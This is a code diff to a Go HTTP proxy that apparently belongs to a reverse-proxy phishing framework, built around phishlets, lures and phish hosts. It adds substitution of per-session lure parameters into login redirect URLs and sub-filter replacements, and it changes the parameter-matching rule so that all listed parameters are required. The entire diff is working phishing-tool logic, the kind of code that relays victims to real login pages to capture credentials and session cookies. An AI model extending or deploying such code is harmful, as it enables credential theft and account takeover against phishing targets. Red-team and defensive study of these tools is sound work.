@@ -523,6 +523,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if err == nil {
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
+						if s, ok := p.sessions[ps.SessionId]; ok {
+							for k, v := range s.Params {
+								rurl = strings.Replace(rurl, "{"+k+"}", v, -1)
+							}
+						}
+						pl := p.getPhishletByPhishHost(req.Host)
+						rurl = pl.paramVal(rurl)
 						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 						if resp != nil {
 							resp.Header.Add("Location", rurl)
@@ -980,16 +987,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									continue
 								}
 								var param_ok bool = true
-								if s, ok := p.sessions[ps.SessionId]; ok {
+								session, ok := p.sessions[ps.SessionId]
+								if ok {
 									var params []string
-									for k := range s.Params {
+									for k := range session.Params {
 										params = append(params, k)
 									}
 									if len(sf.with_params) > 0 {
-										param_ok = false
 										for _, param := range sf.with_params {
-											if stringExists(param, params) {
-												param_ok = true
+											if !stringExists(param, params) {
+												param_ok = false
 												break
 											}
 										}
@@ -1020,6 +1027,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
 									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
 									replace_s = strings.Replace(replace_s, "{phish_domain}", regexp.QuoteMeta(phish_domain), -1)
+									if session != nil {
+										for k, v := range session.Params {
+											replace_s = strings.Replace(replace_s, "{"+k+"}", v, -1)
+										}
+									}
 
 									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
 									if ok {
